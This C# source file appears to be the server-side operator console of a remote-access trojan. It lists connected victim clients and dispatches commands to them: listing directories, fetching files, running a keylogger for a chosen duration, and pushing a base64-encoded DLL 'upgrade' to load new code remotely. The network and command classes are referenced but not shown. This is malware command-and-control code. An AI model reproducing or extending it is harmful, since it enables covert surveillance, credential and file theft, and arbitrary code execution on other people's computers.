using Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Server
{
    class Interpreter
    {
        public static bool inClientSelection = false;

        public static void Start()
        {
            bool isAlive = true;
            while (isAlive)
            {
                Console.Clear();

                
                Network.SendRecieve(GetClient(), GetCommand());
                Console.Clear();
                GetInput("Press ENTER to continue...");
            }
        }

        private static Socket GetClient()
        {
            inClientSelection = true;
            do
            {
                Console.Clear();
                PrintClients();
            }
            while (!int.TryParse(GetInput("Enter a Client: "), out int clientNumber) || 
            clientNumber < 1 || clientNumber > Network.Clients.Count);
            inClientSelection = false;
            return Network.Clients.ElementAt(--clientNumber).Value;
        }

        public static void PrintClients()
        {
            int clientNumber = 0;
            Console.WriteLine("Client list:");
            foreach (var item in Network.Clients)
            {
                Console.WriteLine("{0}. {1}", ++clientNumber, item.Key);
            }
        }

        private static Command GetCommand()
        {
            Command command = null;
            string taskID = string.Empty;
            string[] commandList = { "GetFilesList", "GetFile", "KeyLog", "Upgrade", "CloseConnection" };

            do
            {
                Console.Clear();
                PrintCommands(commandList);
            }
            while (!int.TryParse(GetInput("Enter command number: "), out int commandNumber) || 
            commandNumber < 1 || commandNumber > commandList.Length) ;
            
            //Create taskID for command
            taskID = Database.CreateTask();

            switch (commandList[--commandNumber])
            {
                case "GetFilesList":
                    command = new GetFilesListCommand(taskID, GetInput("Enter directory path: "));
                    break;
                case "GetFile":
                    command = new GetFileCommand(taskID, GetInput("Enter file path: "));
                    break;
                case "KeyLog":
                    while (command == null)
                    {
                        string duration = GetInput("Enter duration (in milliseconds): ");
                        if (int.TryParse(duration, out int timeout))
                        {
                            command = new KeyLogCommand(taskID, duration);
                        }
                        else
                        {
                            Console.WriteLine("Enter an integer!");
                        }
                    }
                    break;
                case "Upgrade":
                    string upgradeDllFilePath = string.Empty;
                    do
                    {
                        upgradeDllFilePath = GetInput("Enter upgrade dll path:");
                    } while (!File.Exists(upgradeDllFilePath));
                    command = new UpgradeCommand(taskID, Convert.ToBase64String(File.ReadAllBytes(upgradeDllFilePath)));
                    break;
                case "CloseConnection":
                    command = new EndConnectionCommand();
                    break;
                default:
                    Console.WriteLine("Illegal command");
                    break;
            }
            return command;
        }

        private static void PrintCommands(string[] commandList)
        {
            int commandNumber = 0;
            Console.WriteLine("Command list:");
            foreach (string item in commandList)
            {
                Console.WriteLine("{0}. {1}", ++commandNumber, item);
            }
        }

        private static string GetInput(string displayMassage)
        {
            Console.WriteLine(displayMassage);
            return Console.ReadLine();
        }
    }
}
